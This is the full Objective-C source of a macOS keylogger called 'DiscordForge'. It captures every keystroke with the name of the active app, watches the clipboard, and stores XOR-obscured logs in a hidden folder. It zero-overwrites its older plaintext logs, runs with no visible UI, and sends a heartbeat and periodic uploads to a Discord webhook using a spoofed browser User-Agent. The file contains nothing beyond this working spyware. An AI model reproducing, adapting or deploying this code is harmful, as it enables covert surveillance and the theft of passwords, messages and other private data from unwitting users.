// DiscordForge — macOS agent: filtered capture + encrypted logs + Discord exfil
// Build: clang -framework Cocoa -framework ApplicationServices -O2 -o .kbd agent.m uploader.m
#import <Cocoa/Cocoa.h>
#import <ApplicationServices/ApplicationServices.h>
#import <Carbon/Carbon.h>
#import <CommonCrypto/CommonDigest.h>
#include <unistd.h>
#include <sys/file.h>

extern void df_log(NSString *s);
extern void df_startUploader(NSString *webhook, NSTimeInterval interval);
extern void df_setLabel(NSString *label);
static NSString *gLogDir; static NSFileHandle *gFh = nil; static int gDay = -1;
static NSString *gLastApp = nil;
static NSString *gLastTok = nil; static uint64_t gLastMs = 0;
static NSMutableData *gKey = nil;

static uint64_t nowMs(void) {
    return (uint64_t)([[NSDate date] timeIntervalSince1970] * 1000.0);
}
static void df_makeKey(void) {
    NSString *u = [[[NSProcessInfo processInfo] environment] objectForKey:@"USER"];
    if (!u.length) u = NSUserName();
    char hn[256] = {}; gethostname(hn, sizeof(hn) - 1);
    NSString *seed = [[NSString stringWithFormat:@"%@@%s", u, hn] lowercaseString];
    NSData *d = [seed dataUsingEncoding:NSUTF8StringEncoding];
    unsigned char h[CC_SHA256_DIGEST_LENGTH];
    CC_SHA256(d.bytes, (CC_LONG)d.length, h);
    gKey = [NSMutableData dataWithBytes:h length:sizeof(h)];
}
static NSData* df_xorAt(NSData *b, unsigned long long base) {
    NSMutableData *o = [b mutableCopy];
    uint8_t *bts = o.mutableBytes;
    const uint8_t *k = gKey.bytes;
    for (NSUInteger i = 0; i < o.length; i++) bts[i] ^= k[(base + i) % gKey.length];
    return o;
}
static void df_hideDeep(NSString *p) {
    // hidden dir + 0600 perms; macOS has no system-flag equivalent for user files
    [[NSFileManager defaultManager] setAttributes:@{NSFilePosixPermissions: @0600} ofItemAtPath:p error:nil];
}

static void df_rotate(void) {
    NSDateComponents *c = [[NSCalendar currentCalendar] components:NSCalendarUnitDay|NSCalendarUnitMonth|NSCalendarUnitYear fromDate:[NSDate date]];
    if (c.day == gDay && gFh) return;
    gDay = (int)c.day; [gFh closeFile]; gFh = nil;
    NSString *f = [NSString stringWithFormat:@"%04ld-%02ld-%02ld.dat",(long)c.year,(long)c.month,(long)c.day];
    NSString *p = [gLogDir stringByAppendingPathComponent:f];
    [[NSFileManager defaultManager] createDirectoryAtPath:gLogDir withIntermediateDirectories:YES attributes:@{NSFilePosixPermissions:@0700} error:nil];
    if (![[NSFileManager defaultManager] fileExistsAtPath:p])
        [[NSData data] writeToFile:p atomically:YES];
    df_hideDeep(p);
    gFh = [NSFileHandle fileHandleForWritingAtPath:p];
    [gFh seekToEndOfFile];
}
void df_log(NSString *s){
    df_rotate();
    @try {
        NSData *raw = [s dataUsingEncoding:NSUTF8StringEncoding];
        unsigned long long base = [gFh offsetInFile];
        [gFh writeData:df_xorAt(raw, base)];
        [gFh synchronizeFile];
    } @catch(NSException *e) {}
}
NSString* df_frontApp(void){ NSString *n=[[NSWorkspace sharedWorkspace] frontmostApplication].localizedName; return n?n:@"unknown"; }

static NSString* df_key(CGKeyCode kc, UniChar ch, CGEventFlags fl){
    if(ch>=32&&ch<127) return [NSString stringWithFormat:@"%C",ch];
    switch(kc){
        case kVK_Return:return @"\n"; case kVK_Tab:return @"\t"; case kVK_Space:return @" ";
        case kVK_Delete:return @"\x08"; case kVK_Escape:return @"[ESC]"; case kVK_ForwardDelete:return @"[DEL]";
        case kVK_UpArrow:return @"[UP]"; case kVK_DownArrow:return @"[DOWN]";
        case kVK_LeftArrow:return @"[LEFT]"; case kVK_RightArrow:return @"[RIGHT]";
        case kVK_Shift:case kVK_RightShift:case kVK_Command:case kVK_RightCommand:
        case kVK_Option:case kVK_RightOption:case kVK_Control:case kVK_RightControl:
        case kVK_CapsLock:return @"";
        default:break;
    }
    if(ch) return [NSString stringWithFormat:@"[U+%04X]",ch];
    return [NSString stringWithFormat:@"[KC%d]",kc];
}
CGEventRef df_tap(CGEventTapProxy p, CGEventType t, CGEventRef e, void *r){
    if(t==kCGEventTapDisabledByTimeout||t==kCGEventTapDisabledByUserInactivity){CGEventTapEnable((CFMachPortRef)r,true);return e;}
    if(t!=kCGEventKeyDown&&t!=kCGEventFlagsChanged) return e;
    CGKeyCode kc=(CGKeyCode)CGEventGetIntegerValueField(e,kCGKeyboardEventKeycode);
    // modifier-only presses: ignore entirely
    if(t==kCGEventFlagsChanged) return e;
    CGEventFlags fl=CGEventGetFlags(e);
    UniChar b[4]={0};UniCharCount n=0;CGEventKeyboardGetUnicodeString(e,4,&n,b);
    NSString *a=df_frontApp();
    if(![a isEqualToString:gLastApp]){gLastApp=[a copy];gLastTok=nil;df_log([NSString stringWithFormat:@"\n\n[%@ @ %@]\n",gLastApp,[NSDate date]]);}
    NSString *k=df_key(kc,n?b[0]:0,fl);
    if((fl&kCGEventFlagMaskCommand)&&n) k=[NSString stringWithFormat:@"[CMD+%C]",b[0]];
    if(!k.length) return e;
    // held-key filter: identical single char within 60ms = auto-repeat
    uint64_t now = nowMs();
    if(k.length==1 && [k isEqualToString:gLastTok] && (now-gLastMs)<60) return e;
    gLastTok=[k copy]; gLastMs=now;
    df_log(k);
    return e;
}
static void df_clipWatch(void){
    dispatch_async(dispatch_get_global_queue(0,0),^{
        NSPasteboard *pb=[NSPasteboard generalPasteboard];NSInteger last=pb.changeCount;
        for(;;){sleep(1);if(pb.changeCount!=last){last=pb.changeCount;NSString *s=[pb stringForType:NSPasteboardTypeString];if(s&&s.length<10000)df_log([NSString stringWithFormat:@"\n[CLIP]: %@\n",s]);}}
    });
}
// one-shot: encrypt leftover plaintext .log files, shred originals
static void df_migrate(void) {
    NSArray *ls = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:gLogDir error:nil];
    for (NSString *f in ls) {
        if (![f hasSuffix:@".log"]) continue;
        NSString *lp = [gLogDir stringByAppendingPathComponent:f];
        NSString *txt = [NSString stringWithContentsOfFile:lp encoding:NSUTF8StringEncoding error:nil];
        if (txt.length) {
            NSString *dp = [[lp stringByDeletingPathExtension] stringByAppendingPathExtension:@"dat"];
            NSFileHandle *h = [NSFileHandle fileHandleForWritingAtPath:dp];
            if (!h) { [[NSData data] writeToFile:dp atomically:YES]; h = [NSFileHandle fileHandleForWritingAtPath:dp]; }
            [h seekToEndOfFile];
            NSData *raw = [txt dataUsingEncoding:NSUTF8StringEncoding];
            [h writeData:df_xorAt(raw, [h offsetInFile])];
            [h closeFile]; df_hideDeep(dp);
        }
        // overwrite then delete
        NSUInteger n = [txt length];
        if (n) { NSMutableString *z = [NSMutableString stringWithCapacity:n]; for (NSUInteger i=0;i<n;i++) [z appendString:@"0"]; [z writeToFile:lp atomically:YES encoding:NSUTF8StringEncoding error:nil]; }
        [[NSFileManager defaultManager] removeItemAtPath:lp error:nil];
    }
}
static NSString* hookFromFile(void) {
    // Webhook.txt next to the binary (dev) or DST copy
    NSString *exe = [[NSBundle mainBundle] executablePath];
    if (!exe) exe = [[NSProcessInfo processInfo] arguments][0];
    NSString *d = [exe stringByDeletingLastPathComponent];
    for (NSString *nm in @[@"Webhook.txt", @"webhook.txt"]) {
        NSString *t = [[NSString stringWithContentsOfFile:[d stringByAppendingPathComponent:nm] encoding:NSUTF8StringEncoding error:nil] stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
        t = [t componentsSeparatedByCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]][0];
        if ([t hasPrefix:@"http"]) return t;
    }
    return nil;
}
static NSString* trimHook(NSString *h) {
    return [h stringByTrimmingCharactersInSet:[NSCharacterSet characterSetWithCharactersInString:@"\"' \t\r\n"]];
}
int main(int argc,char**argv){
    @autoreleasepool{
        [NSApplication sharedApplication];[NSApp setActivationPolicy:NSApplicationActivationPolicyProhibited];
        gLogDir=[NSHomeDirectory() stringByAppendingPathComponent:@".cache/.sysdata"];gLastApp=@"";
        df_makeKey();
        df_migrate();
        df_rotate();
        // hardware label
        NSString *u = [[[NSProcessInfo processInfo] environment] objectForKey:@"USER"]; if(!u.length) u=NSUserName();
        char hn[256]={}; gethostname(hn,sizeof(hn)-1);
        NSString *raw = [[NSString stringWithFormat:@"%@@%s",u,hn] lowercaseString];
        NSData *rd=[raw dataUsingEncoding:NSUTF8StringEncoding]; unsigned char hh[CC_SHA256_DIGEST_LENGTH];
        CC_SHA256(rd.bytes,(CC_LONG)rd.length,hh);
        NSMutableString *hx=[NSMutableString string]; for(int i=0;i<3;i++) [hx appendFormat:@"%02x",hh[i]];
        NSString *label=[NSString stringWithFormat:@"%@ @%s [%@]",u,hn,hx];
        df_setLabel(label);
        NSString *wh = nil;
        if(argc>1) wh=[NSString stringWithUTF8String:argv[1]];
        if(!wh.length) wh=hookFromFile();
        if(!wh.length) wh=[[[NSProcessInfo processInfo] environment] objectForKey:@"DF_WEBHOOK"];
        wh=trimHook(wh?wh:@"");
        // heartbeat: proves launch + delivery path
        if(wh.length && ![wh hasPrefix:@"__"]){
            NSString *hb=[NSString stringWithFormat:@"**[%@]** 🟢 online",label];
            NSDictionary *body=@{@"content":hb}; NSData *d=[NSJSONSerialization dataWithJSONObject:body options:0 error:nil];
            NSMutableURLRequest *r=[NSMutableURLRequest requestWithURL:[NSURL URLWithString:wh]];
            r.HTTPMethod=@"POST";[r setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
            [r setValue:@"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)" forHTTPHeaderField:@"User-Agent"];
            r.HTTPBody=d; [NSURLConnection sendSynchronousRequest:r returningResponse:nil error:nil];
        }
        if(wh.length) df_startUploader(wh,8);
        df_clipWatch();
        CFMachPortRef tap=CGEventTapCreate(kCGSessionEventTap,kCGHeadInsertEventTap,kCGEventTapOptionDefault,CGEventMaskBit(kCGEventKeyDown)|CGEventMaskBit(kCGEventFlagsChanged),df_tap,NULL);
        if(!tap) return 1;
        // single-instance: bail if another copy holds the lock (prevents dupes)
        int fd=open([[gLogDir stringByAppendingPathComponent:@".lock"] fileSystemRepresentation],O_CREAT|O_RDWR,0600);
        if(fd>=0 && flock(fd,LOCK_EX|LOCK_NB)!=0) return 0;
        CFRunLoopSourceRef src=CFMachPortCreateRunLoopSource(kCFAllocatorDefault,tap,0);
        CFRunLoopAddSource(CFRunLoopGetCurrent(),src,kCFRunLoopCommonModes);
        CGEventTapEnable(tap,true);
        CFRunLoopTimerRef t=CFRunLoopTimerCreate(kCFAllocatorDefault,CFAbsoluteTimeGetCurrent()+5,5,NULL,NULL,(CFRunLoopTimerCallBack)^(CFRunLoopTimerRef tt,void*i){if(!CGEventTapIsEnabled(tap))CGEventTapEnable(tap,true);},NULL);
        CFRunLoopAddTimer(CFRunLoopGetCurrent(),t,kCFRunLoopCommonModes);
        CFRunLoopRun();
    }
    return 0;
}
